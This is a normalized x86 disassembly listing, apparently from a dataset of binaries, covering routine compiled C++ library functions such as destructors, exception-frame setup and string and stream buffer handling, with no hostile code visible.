cmp ebx [ r--data ]
je r-xdata
mov [ ecx + 0x3c ] eax
test [ ebp + 0x24 ] 0x2
je r-xdata
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop edi
xor ecx ecx
mov [ eax ] esi
pop esi
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov ebx [ r--data ]
mov esi edx
mov edi [ edi ]
mov [ ebp + 0x24 ] edi
test edi edi
je r-xdata
test ebx ebx
jl r-xdata
test ebx ebx
jl r-xdata
jg r-xdata
jg r-xdata
mov edx [ ecx + 0x10 ]
mov edi [ edx ]
mov eax [ ecx + 0x3c ]
sub eax edi
cdq
cmp ebx edx
jg r-xdata
test esi esi
jb r-xdata
mov edx [ ecx + 0x10 ]
mov edi [ edx ]
mov eax [ ecx + 0x3c ]
sub eax edi
cdq
cmp ebx edx
jg r-xdata
test esi esi
jb r-xdata
mov edx [ r--data ]
jl r-xdata
jl r-xdata
sub edi [ ebp - 0x4 ]
mov eax [ ecx + 0x30 ]
add edi esi
sub [ eax ] edi
mov eax [ ecx + 0x20 ]
add [ eax ] edi
test [ ebp + 0x24 ] 0x2
je r-xdata
cmp esi eax
ja r-xdata
sub edi [ ebp + 0x24 ]
mov eax [ ecx + 0x34 ]
add edi esi
sub [ eax ] edi
mov ecx [ ecx + 0x24 ]
add [ ecx ] edi
jmp r-xdata
cmp esi eax
ja r-xdata
mov eax [ ecx + 0x24 ]
mov edi [ eax ]
test edi edi
je r-xdata
mov eax [ ecx + 0x20 ]
mov edx [ eax ]
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
add eax edi
mov edi [ ecx + 0x24 ]
mov [ edi ] edx
mov ecx [ ecx + 0x34 ]
sub eax edx
mov [ ecx ] eax
jmp r-xdata
sub_10009fe0
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x8 ]
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
lea eax [ esi + 0x8 ]
mov [ edx + eax - 0x8 ] r--data
push eax
mov [ eax ] r--data
call sub_10019895
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10019ce4
add esp 0x4
sub_1000a020
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x10 ]
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
lea eax [ esi + 0x10 ]
mov [ edx + eax - 0x10 ] r--data
push eax
mov [ eax ] r--data
call sub_10019895
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10019ce4
add esp 0x4
sub_1000a060
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_100098e0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10019ce4
add esp 0x4
sub_1000a090
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x18 ]
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
lea eax [ esi + 0x18 ]
mov [ edx + eax - 0x18 ] r--data
mov ecx [ eax - 0x8 ]
mov edx [ ecx + 0x4 ]
mov [ edx + eax - 0x8 ] r--data
mov ecx [ eax - 0x18 ]
mov edx [ ecx + 0x4 ]
mov [ edx + eax - 0x18 ] r--data
push eax
mov [ eax ] r--data
call sub_10019895
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10019ce4
add esp 0x4
sub_1000a0f0
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100093e0
mov ecx esi
call sub_100098e0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10019ce4
add esp 0x4
sub_1000a120
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
push ebx
push esi
push edi
mov edi ecx
jbe r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebx
pop ebp
retn 0xc
mov ebx [ edi + 0x10 ]
mov edx [ ebp + 0xc ]
cmp edx ebx
jae r-xdata
mov ecx [ edi + 0x14 ]
cmp ecx 0x10
jb r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov esi edi
mov esi [ edi ]
jmp r-xdata
add ebx eax
cmp ecx 0x10
jb r-xdata
lea esp [ esp ]
add esi edx
cmp esi ebx
jae r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
inc esi
cmp esi ebx
jb r-xdata
mov eax esi
sub eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
mov edi [ edi ]
mov eax [ ebp + 0x10 ]
movsx ecx [ esi ]
mov edx [ ebp + 0x8 ]
push eax
push ecx
push edx
call sub_1001aac0
add esp 0xc
test eax eax
jne r-xdata
sub_1000a1a0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c5fb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
lea ecx [ esi + 0x4 ]
mov [ esi ] r--data
call sub_100199e5
push 0x4
mov [ ebp - 0x4 ] 0x0
call sub_1001a818
mov edi eax
add esp 0x4
test edi edi
je r-xdata
xor edi edi
call sub_100196a3
mov [ edi ] eax
call sub_10019462
push 0x0
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_10019397
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp - 0x10 ]
call sub_100193bf
jmp r-xdata
inc eax
mov [ ebx + 0x4 ] eax
lea eax [ esi + 0x8 ]
mov [ esi + 0x10 ] eax
lea ecx [ esi + 0x18 ]
mov [ esi + 0x20 ] ecx
lea edx [ esi + 0x1c ]
mov [ esi + 0x24 ] edx
mov [ esi + 0x38 ] edi
lea eax [ esi + 0xc ]
mov [ esi + 0x14 ] eax
lea ecx [ esi + 0x28 ]
mov [ esi + 0x30 ] ecx
lea edx [ esi + 0x2c ]
mov [ esi + 0x34 ] edx
mov [ eax ] 0x0
mov eax [ esi + 0x24 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x34 ]
mov [ ecx ] 0x0
mov edx [ esi + 0x10 ]
mov [ edx ] 0x0
mov eax [ esi + 0x20 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x30 ]
mov [ ecx ] 0x0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1000a290
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10019ce4
add esp 0x4
sub_1000a2c0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x14 ]
mov [ eax ] 0x25
lea ecx [ eax + 0x1 ]
test dl 0x20
je r-xdata
test dl 0x8
je r-xdata
mov [ ecx ] 0x2b
inc ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov bl [ edi ]
cmp bl 0x4c
je r-xdata
mov [ ecx ] 0x23
inc ecx
mov [ ecx ] 0x3649
mov [ ecx + 0x2 ] 0x34
add ecx 0x3
mov [ ecx ] bl
inc ecx
jmp r-xdata
cmp esi 0x800
je r-xdata
pop edi
mov dl 0x6f
pop esi
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
pop ebx
pop ebp
retn
mov esi edx
and esi 0xe00
cmp esi 0x400
jne r-xdata
add dl dl
add dl dl
add dl dl
not dl
and dl 0x20
pop edi
or dl 0x58
pop esi
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
pop ebx
pop ebp
retn
mov dl [ edi + 0x1 ]
pop edi
pop esi
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
pop ebx
pop ebp
retn
sub_1000a350
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp eax 0x1
jne r-xdata
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
add ecx [ ebp + 0x8 ]
push eax
movsx eax [ ebp + 0x10 ]
push eax
push ecx
call sub_1001a9b0
add esp 0xc
pop ebp
retn 0xc
mov ecx [ ecx ]
mov al [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ ecx + edx ] al
pop ebp
retn 0xc
mov ecx [ ecx ]
sub_1000a390
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
push eax
call sub_1001a8e4
mov ecx [ esi + 0x10 ]
push ecx
call sub_1001a8e4
mov edx [ esi + 0x14 ]
push edx
call sub_1001a8e4
add esp 0xc
pop esi
retn
sub_1000a3c0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c620
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
mov [ ebp - 0x18 ] ebx
call sub_1001ab6d
xor ecx ecx
mov [ ebp - 0x14 ] eax
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x10 ] ecx
mov [ ebx + 0x14 ] ecx
mov [ ebp - 0x4 ] ecx
mov edi r--data
cmp [ ebp + 0xc ] cl
jne r-xdata
call sub_10019327
mov eax edi
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
mov edi [ eax + 0x8 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
lea esi [ eax + 0x1 ]
push esi
call sub_100191af
add esp 0x4
mov ecx eax
mov [ ebx + 0x8 ] eax
call sub_10019327
mov edi 0x6
push edi
mov esi r--data
call sub_100191af
add esp 0x4
mov ecx eax
mov dl [ edi ]
mov [ ecx ] dl
dec esi
inc ecx
inc edi
jmp r-xdata
mov [ ebx + 0x10 ] eax
call sub_10019327
mov edi 0x5
push edi
mov esi r--data
call sub_100191af
add esp 0x4
mov ecx eax
jmp r-xdata
mov dl [ esi ]
mov [ ecx ] dl
dec edi
inc ecx
inc esi
jmp r-xdata
test esi esi
je r-xdata
test edi edi
je r-xdata
test edi edi
je r-xdata
mov [ ebx + 0x14 ] eax
call sub_10019327
mov esi [ ebp - 0x14 ]
mov eax [ esi ]
mov cl [ eax ]
mov [ ebx + 0xc ] cl
call sub_10019327
cmp [ ebp + 0xc ] 0x0
mov edx [ esi + 0x4 ]
mov al [ edx ]
mov [ ebx + 0xd ] al
je r-xdata
mov dl [ esi ]
mov [ ecx ] dl
dec edi
inc ecx
inc esi
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_10019327
mov [ ebx + 0xc ] 0x2e
call sub_10019327
mov [ ebx + 0xd ] 0x2c
sub_1000a500
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c674
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
xor ebx ebx
push ebx
call sub_10019397
mov [ ebp - 0x4 ] ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] bl
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] bl
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] bl
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] bl
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x4
cmp eax ebx
jne r-xdata
push eax
push esi
call sub_100195b3
add esp 0x8
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp + 0x8 ] r--data
call sub_10019ba5
push r--data
lea ecx [ ebp - 0x1c ]
push ecx
mov [ ebp - 0x1c ] r--data
call sub_1001a898
sub_1000a5b0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c6c4
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
push esi
mov [ ebp - 0x4 ] 0x4
call sub_10019540
mov eax [ esi + 0x1c ]
xor edi edi
add esp 0x4
cmp eax edi
je r-xdata
mov [ esi + 0x1c ] edi
mov eax [ esi + 0x14 ]
cmp eax edi
je r-xdata
push eax
call sub_1001a3eb
add esp 0x4
mov [ esi + 0x14 ] edi
mov eax [ esi + 0xc ]
cmp eax edi
je r-xdata
push eax
call sub_1001a3eb
add esp 0x4
mov [ esi + 0xc ] edi
mov eax [ esi + 0x4 ]
cmp eax edi
je r-xdata
push eax
call sub_1001a3eb
add esp 0x4
mov ecx esi
mov [ esi + 0x4 ] edi
mov [ ebp - 0x4 ] 0xffffffff
call sub_100193bf
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
push eax
call sub_1001a3eb
add esp 0x4
sub_1000a660
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c6eb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x38
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test eax eax
je r-xdata
mov eax 0x2
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push 0x18
call sub_1001a818
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] ebx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x44 ]
call sub_1000a5b0
add eax 0x1c
mov eax ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ ecx ] esi
test bl 0x1
je r-xdata
push eax
lea ecx [ ebp - 0x44 ]
call sub_1000a500
lea ecx [ ebp - 0x20 ]
push ecx
mov ebx 0x1
mov [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_100192c7
mov edx [ eax ]
mov [ esi + 0x8 ] edx
mov ecx [ eax + 0x4 ]
mov [ esi + 0xc ] ecx
mov edx [ eax + 0x8 ]
mov [ esi + 0x10 ] edx
mov eax [ eax + 0xc ]
add esp 0x4
mov [ esi + 0x14 ] eax
jmp r-xdata
sub_1000a740
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c71b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov eax [ ecx - 0x60 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x60 ] r--data
lea esi [ ecx - 0x48 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
call sub_100093e0
mov ecx esi
call sub_100098e0
mov eax [ esi - 0x18 ]
mov ecx [ eax + 0x4 ]
mov [ ecx + esi - 0x18 ] r--data
mov edx [ esi - 0x8 ]
mov eax [ edx + 0x4 ]
mov [ eax + esi - 0x8 ] r--data
mov ecx [ esi - 0x18 ]
mov edx [ ecx + 0x4 ]
mov [ edx + esi - 0x18 ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_1000a7d0
push ebp
mov ebp esp
sub esp 0x8
push esi
mov esi ecx
test [ esi + 0x40 ] 0x8
push edi
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0xffffffff
jne r-xdata
mov edi [ esi + 0x24 ]
mov edx [ edi ]
test edx edx
je r-xdata
mov edx [ esi + 0x24 ]
mov edi [ edx ]
push ebx
test edi edi
je r-xdata
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx [ esi + 0x3c ]
cmp edx ecx
jae r-xdata
test [ esi + 0x40 ] 0x2
jne r-xdata
mov ecx [ esi + 0x34 ]
mov ebx [ ecx ]
mov edx edi
add ebx edx
cmp edx ebx
jae r-xdata
mov eax [ esi + 0x34 ]
mov eax [ eax ]
add eax edx
mov [ edi ] ecx
sub eax ecx
mov ecx [ esi + 0x34 ]
mov [ ecx ] eax
pop ebx
pop edi
or eax 0xffffffff
pop esi
mov esp ebp
pop ebp
retn 0x4
test edi edi
jne r-xdata
dec [ ecx ]
jmp r-xdata
mov eax [ esi + 0x34 ]
mov ecx [ esi + 0x10 ]
mov ebx [ eax ]
sub ebx [ ecx ]
add ebx edi
xor ebx ebx
jmp r-xdata
mov esi [ esi + 0x24 ]
mov ecx [ esi ]
pop ebx
lea edx [ ecx + 0x1 ]
mov [ esi ] edx
pop edi
mov [ ecx ] al
pop esi
mov esp ebp
pop ebp
retn 0x4
test eax eax
je r-xdata
mov eax 0x20
jmp r-xdata
mov eax ebx
shr eax 0x1
cmp eax 0x20
jae r-xdata
mov edi edi
mov edx 0x7fffffff
sub edx eax
cmp edx ebx
jae r-xdata
test eax eax
jne r-xdata
shr eax 0x1
jne r-xdata
add eax ebx
push eax
lea ecx [ esi + 0x44 ]
mov [ ebp - 0x4 ] eax
call sub_10006930
mov edi eax
mov eax [ esi + 0x10 ]
mov edx [ eax ]
mov [ ebp - 0x8 ] edx
test ebx ebx
je r-xdata
mov ecx [ esi + 0x14 ]
mov [ esi + 0x3c ] edi
mov [ ecx ] edi
mov eax [ esi + 0x24 ]
mov [ eax ] edi
mov ecx [ esi + 0x34 ]
mov eax [ ebp - 0x4 ]
mov [ ecx ] eax
test [ esi + 0x40 ] 0x4
jne r-xdata
push ebx
push edx
push edi
call sub_10019cf0
mov edx [ ebp - 0x8 ]
add esp 0xc
test ebx ebx
jne r-xdata
mov ecx [ esi + 0x10 ]
mov [ ecx ] edi
mov eax [ esi + 0x20 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x30 ]
mov [ ecx ] edi
jmp r-xdata
mov eax [ esi + 0x10 ]
mov [ eax ] edi
mov ecx [ esi + 0x20 ]
mov [ ecx ] edi
mov eax [ esi + 0x30 ]
mov [ eax ] 0x1
jmp r-xdata
mov eax [ esi + 0x24 ]
mov ecx edi
sub ecx edx
add [ esi + 0x3c ] ecx
mov eax [ eax ]
mov ecx [ esi + 0x14 ]
mov ebx edi
sub eax edx
sub ebx edx
add [ ecx ] ebx
mov ecx [ esi + 0x24 ]
add eax edi
mov [ ecx ] eax
mov ecx edi
sub ecx eax
add ecx [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
mov [ eax ] ecx
test [ esi + 0x40 ] 0x4
je r-xdata
test [ esi + 0x40 ] 0x1
je r-xdata
mov eax [ esi + 0x24 ]
mov ecx [ eax ]
mov eax [ esi + 0x20 ]
mov eax [ eax ]
mov ebx [ esi + 0x10 ]
sub eax edx
add eax edi
mov [ ebx ] edi
mov edi [ esi + 0x20 ]
sub ecx eax
mov [ edi ] eax
mov eax [ esi + 0x30 ]
inc ecx
mov [ eax ] ecx
mov eax [ esi + 0x34 ]
or [ esi + 0x40 ] 0x1
dec [ eax ]
mov eax [ ebp + 0x8 ]
push edx
call sub_10019ce4
add esp 0x4
sub_1000a980
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x1c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop ebx
pop ebp
retn
push esi
push edi
mov edi [ ebp + 0x18 ]
mov [ ebp + 0x10 ] 0x1
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
mov dl [ edi ]
je r-xdata
test ecx ecx
je r-xdata
pop edi
pop esi
mov eax [ ecx ]
mov eax [ eax + 0xc ]
movzx edx dl
push edx
call eax
mov eax [ ecx + 0x34 ]
cmp [ eax ] 0x0
jle r-xdata
inc edi
dec ebx
jne r-xdata
dec [ eax ]
mov eax [ ecx + 0x24 ]
mov ecx [ eax ]
lea esi [ ecx + 0x1 ]
mov [ eax ] esi
mov [ ecx ] dl
movzx eax dl
jmp r-xdata
mov ecx [ ebp + 0x14 ]
cmp eax 0xffffffff
jne r-xdata
sub_1000a9f0
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x1c ]
test esi esi
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop esi
pop ebp
retn
push ebx
mov bl [ ebp + 0x18 ]
mov [ ebp + 0x10 ] 0x1
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
test ecx ecx
je r-xdata
pop ebx
mov eax [ ecx ]
mov eax [ eax + 0xc ]
movzx edx bl
push edx
call eax
mov eax [ ecx + 0x34 ]
cmp [ eax ] 0x0
jle r-xdata
dec esi
jne r-xdata
dec [ eax ]
mov eax [ ecx + 0x24 ]
mov ecx [ eax ]
lea edx [ ecx + 0x1 ]
mov [ eax ] edx
mov [ ecx ] bl
movzx eax bl
jmp r-xdata
mov ecx [ ebp + 0x14 ]
cmp eax 0xffffffff
jne r-xdata
sub_1000aa60
push ebp
mov ebp esp
push ecx
mov eax [ ecx ]
mov edx [ eax + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push esi
mov [ ebp - 0x4 ] 0x0
call edx
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_1000aa80
push ebp
mov ebp esp
push ecx
mov eax [ ecx ]
mov edx [ eax + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
push esi
mov [ ebp - 0x4 ] 0x0
call edx
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_1000aaa0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
test ebx ebx
je r-xdata
push r--data
call sub_100190f4
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ eax + ebx ]
cmp edi 0xfffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_100190f4
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_10006a10
test edi edi
je r-xdata
mov edx [ ebp + 0xc ]
mov eax [ esi + 0x10 ]
push edx
push ebx
push eax
mov ecx esi
call sub_1000a350
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
pop edi
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0x8
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
sub_1000ab50
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
mov edi [ ebp + 0x18 ]
nop
mov esi ebx
sub eax edi
mov esi eax
jmp r-xdata
mov edx [ eax ]
mov ecx [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
pop edi
pop esi
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x20 ]
test cl cl
je r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
push esi
push edi
push eax
mov eax [ ebp + 0x8 ]
push ecx
lea edx [ ebp - 0x8 ]
push edx
push eax
call sub_1000a980
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov edx [ eax + 0x4 ]
add esp 0x18
add edi esi
sub ebx esi
mov [ ebp + 0x14 ] edx
je r-xdata
inc edi
dec ebx
jmp r-xdata
mov edx [ eax ]
push 0x1
push ecx
mov ecx [ eax + 0x4 ]
push ecx
mov ecx [ ebp + 0x8 ]
push edx
lea eax [ ebp - 0x10 ]
push eax
push ecx
call sub_1000a9f0
mov edx [ eax ]
mov [ ebp + 0x10 ] edx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x14 ] eax
push ebx
push 0x0
push edi
call sub_1001aac0
add esp 0xc
test eax eax
je r-xdata
sub_1000abf0
push ebp
mov ebp esp
push ecx
mov eax [ ecx ]
mov edx [ eax + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push esi
mov [ ebp - 0x4 ] 0x0
call edx
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_1000ac10
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c748
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x0
lea ecx [ ebp - 0x18 ]
call sub_10019397
cmp [ rw-data ] 0x0
mov ebx [ rw-data ]
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] ebx
jne r-xdata
mov edi [ ebp + 0x8 ]
mov esi [ rw-data ]
mov eax [ edi ]
cmp esi [ eax + 0xc ]
jae r-xdata
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10019397
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
mov ecx [ eax + 0x8 ]
mov ecx [ ecx + esi * 4 ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x14 ]
call sub_100193bf
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ rw-data ] eax
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov esi ecx
call sub_10019462
cmp esi [ eax + 0xc ]
jae r-xdata
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_100193bf
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
mov edx [ eax + 0x8 ]
mov esi [ edx + esi * 4 ]
jmp r-xdata
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_1000a660
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov esi ebx
jmp r-xdata
test esi esi
jne r-xdata
mov esi [ ebp - 0x10 ]
push 0x0
lea ecx [ ebp + 0x8 ]
mov [ rw-data ] esi
call sub_10019397
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
push r--data
lea ecx [ ebp - 0x24 ]
call sub_10019c0c
push r--data
lea ecx [ ebp - 0x24 ]
push ecx
call sub_1001a898
lea ecx [ ebp + 0x8 ]
call sub_100193bf
push esi
call sub_100193eb
add esp 0x4
inc eax
mov [ esi + 0x4 ] eax
sub_1000ad50
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c77b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test eax eax
je r-xdata
mov eax 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push 0x10
call sub_1001a818
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] ebx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_1000a5b0
add eax 0x1c
mov eax ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ ecx ] esi
test bl 0x1
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_1000a500
mov ebx 0x1
mov [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_10019327
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_1000ae30
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
push eax
mov [ esi ] r--data
call sub_1001a8e4
mov ecx [ esi + 0x10 ]
push ecx
call sub_1001a8e4
mov edx [ esi + 0x14 ]
push edx
call sub_1001a8e4
add esp 0xc
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
